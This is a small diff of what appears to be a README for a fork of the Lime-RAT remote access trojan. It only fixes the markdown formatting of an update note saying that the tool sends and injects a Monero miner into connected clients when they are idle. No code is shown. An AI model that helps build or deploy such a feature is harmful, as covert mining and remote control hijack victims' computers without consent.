@@ -10,5 +10,5 @@
 https://github.com/NYAN-x-CAT/Lime-RAT
 
 
-##My Updates 
-# - When Client Connected and XMR state is Idle, the XMR Miner will be sent and injected ..
+## My Updates 
+- When Client Connected and XMR state is Idle, the XMR Miner will be sent and injected ..
